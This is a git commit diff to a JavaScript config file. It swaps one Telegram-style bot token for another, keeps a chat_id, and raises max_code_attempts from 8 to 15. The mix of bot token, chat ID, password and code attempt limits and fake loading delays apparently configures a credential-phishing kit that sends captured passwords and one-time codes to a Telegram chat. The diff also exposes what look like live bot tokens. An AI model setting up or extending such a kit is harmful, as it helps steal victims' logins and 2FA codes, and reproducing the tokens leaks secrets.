191ec443c58f53b52c4ff4c5d8f9064eeb1bd4ad
kindscongchua7-crypto <kindscongchua7@gmail.com>
2026-09-13 13:38:24 +0700

    Modify config values for token and attempts
    Updated token and increased max_code_attempts.

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
-    token: '8936524763:AAHGKRPFqvXGV_pJhPK0T4FeieHlAl7yqkk',
+    token: '8559527397:AAFtpBaW71MXOe9ME1U87HX6jkufsd-GfY0',
     chat_id: '1465093776‎',
     max_password_attempts: 2,
-    max_code_attempts: 8,
+    max_code_attempts: 15,
     password_loading_time: 2,
     code_loading_time: 3
 };
